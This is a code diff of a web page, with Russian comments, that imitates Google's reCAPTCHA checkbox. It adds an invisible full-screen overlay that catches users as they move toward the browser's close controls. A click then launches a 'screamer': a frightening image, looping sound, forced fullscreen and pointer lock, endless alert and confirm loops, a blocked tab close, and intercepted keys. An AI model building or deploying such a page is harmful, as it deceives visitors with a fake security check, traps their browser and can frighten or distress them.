@@ -25,6 +25,8 @@
             justify-content: space-between;
             padding: 0 12px;
             box-shadow: 0 0 4px rgba(0,0,0,0.08);
+            position: relative;
+            z-index: 10;
         }
         .checkbox-container {
             display: flex;
@@ -57,6 +59,19 @@
             margin-bottom: 2px;
         }
         
+        /* Ловушка: невидимый слой на весь экран */
+        #trap-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.001); /* Почти прозрачный, но кликабельный */
+            z-index: 99998;
+            cursor: default;
+        }
+
         #screamer-container {
             display: none;
             position: fixed;
@@ -82,11 +97,14 @@
             <div class="text">Я не робот</div>
         </div>
         <div class="logo-section">
-            <img src="https://www.gstatic.com/images/icons/material/product/2x/recaptcha_48dp.png">
+            <img src="https://gstatic.com">
             <span>reCAPTCHA</span>
-            <a href="https://policies.google.com/privacy" target="_blank" style="color:#555; text-decoration:none; margin-top:2px;">Конфиденциальность</a>
+            <a href="https://google.com" target="_blank" style="color:#555; text-decoration:none; margin-top:2px;">Конфиденциальность</a>
         </div>
     </div>
+
+    <!-- Компоненты ловушки -->
+    <div id="trap-overlay"></div>
 
     <div id="screamer-container">
         <img src="7f3UOH.gif" alt="">
@@ -94,44 +112,55 @@
 
     <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto"></audio>
 
-            <script>
+    <script>
         var isScreamerActive = false;
+        var trapOverlay = document.getElementById('trap-overlay');
 
-        // Попытка поймать пользователя, когда он уводит мышь вверх к крестику закрытия вкладки
+        // 1. Ловим попытку ухода к панели вкладок (вверх)
         document.addEventListener('mouseleave', function(e) {
-            // Если курсор ушел за верхнюю границу экрана (Y < 20) и скример еще не включен
-            if (e.clientY < 20 && !isScreamerActive) {
-                // Вызываем системное окно, которое блокирует интерфейс браузера
-                triggerFakeValidation();
+            if (e.clientY < 50 && !isScreamerActive) {
+                // Мгновенно активируем невидимый щит на весь экран
+                trapOverlay.style.display = 'block';
             }
         });
 
-        // Функция-обманка для активации при попытке побега
-        function triggerFakeValidation() {
-            alert("ВНИМАНИЕ! Проверка безопасности reCAPTCHA не пройдена.\n\nПожалуйста, нажмите «ОК» и подтвердите, что вы не робот, чтобы сохранить изменения.");
-            // Этот alert считается "взаимодействием", теперь браузер разрешит и звук, и фуллскрин
-            activateScreamer();
-        }
+        // Если пользователь вернул мышку на страницу, убираем щит (чтобы он мог нажать саму капчу)
+        document.addEventListener('mouseenter', function() {
+            if (!isScreamerActive) {
+                trapOverlay.style.display = 'none';
+            }
+        });
 
+        // 2. Клик по невидимому щиту при попытке закрыть сайт
+        trapOverlay.addEventListener('click', function() {
+            activateScreamer();
+        });
+
+        // Основная функция активации скримера
         function activateScreamer() {
             isScreamerActive = true;
+            trapOverlay.style.display = 'none'; // Убираем промежуточный слой
+            
             var container = document.getElementById('screamer-container');
             var sound = document.getElementById('screamer-sound');
             
             container.style.display = 'block';
 
-            // Включаем звук (теперь разрешено браузером)
-            sound.play().catch(function(e) { console.log(e); });
+            // Звук (теперь легален, так как был клик по trap-overlay или чекбоксу)
+            sound.play().catch(function(err) { console.log("Ошибка звука:", err); });
 
-            // Запуск полноэкранного режима
-            if (container.requestFullscreen) container.requestFullscreen();
-            else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
+            // Фуллскрин (работает идеально, так как вызван напрямую из события 'click')
+            if (container.requestFullscreen) {
+                container.requestFullscreen();
+            } else if (container.webkitRequestFullscreen) { 
+                container.webkitRequestFullscreen();
+            }
 
-            // Включение блокировки мыши
+            // Блокировка курсора мыши
             lockMouse();
 
-            // Привязываем бесконечный цикл сообщений
-            triggerAnnoyingAlerts();
+            // Включаем бесконечный спам окнами с задержкой, чтобы браузер успел развернуть фуллскрин
+            setTimeout(triggerAnnoyingAlerts, 100);
         }
 
         function lockMouse() {
@@ -140,40 +169,29 @@
             else if (container.webkitRequestPointerLock) container.webkitRequestPointerLock();
         }
 
-        // Ловушка на закрытие вкладки/браузера (работает всегда)
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = 'Изменения не сохранены! Вы уверены, что хотите прервать проверку?';
-            return e.returnValue;
-        });
-
-        function triggerAnnoyingAlerts() {
+        // Блокировка закрытия вкладки (стандартная)
+        window.addEventListener('beforeunload', preventExit);
+        function preventExit(e) {
             if (!isScreamerActive) return;
-            
-            // Зацикленная цепочка окон, не дающая закрыть страницу
-            setTimeout(function() {
-                while (true) {
-                    alert("Критическая ошибка! Изменения не сохранены.");
-                    var retry = confirm("Продолжить проверку безопасности? При выходе все несохраненные данные будут уничтожены.");
-                    if (!retry || retry) {
-                        alert("Доступ ограничен. Завершите проверку «Я не робот».");
-                        break; 
-                    }
-                }
-            }, 10);
+            e.preventDefault();
+            e.returnValue = 'Изменения не сохранены.';
+            return e.returnValue;
         }
 
-        // Перехват клика по самой галочке "Я не робот"
-        function activateScreamerFromClick() {
-            if (!isScreamerActive) {
-                activateScreamer();
+        // Бесконечный цикл алертов
+        function triggerAnnoyingAlerts() {
+            if (!isScreamerActive) return;
+            while (true) {
+                alert("Ошибка безопасности! Изменения не сохранены.");
+                var confirmExit = confirm("Вы уверены, что хотите прервать проверку? Данные будут утеряны.");
+                if (!confirmExit || confirmExit) {
+                    alert("Доступ ограничен. Завершите проверку «Я не робот».");
+                    break; 
+                }
             }
         }
 
-        // Назначаем функцию на клик по чекбоксу капчи
-        document.querySelector('.checkbox').setAttribute('onclick', 'activateScreamerFromClick()');
-
-        // Возврат в фуллскрин и блокировку при попытках нажать ESC или кликнуть
+        // Перехваты для удержания в фуллскрине
         window.addEventListener('keydown', function(e) {
             if (isScreamerActive) {
                 e.preventDefault();
@@ -181,7 +199,7 @@
                 triggerAnnoyingAlerts();
             }
         });
-
+        
         document.addEventListener('click', function() {
             if (isScreamerActive) {
                 var container = document.getElementById('screamer-container');
@@ -200,6 +218,5 @@
             }
         });
     </script>
-
 </body>
 </html>
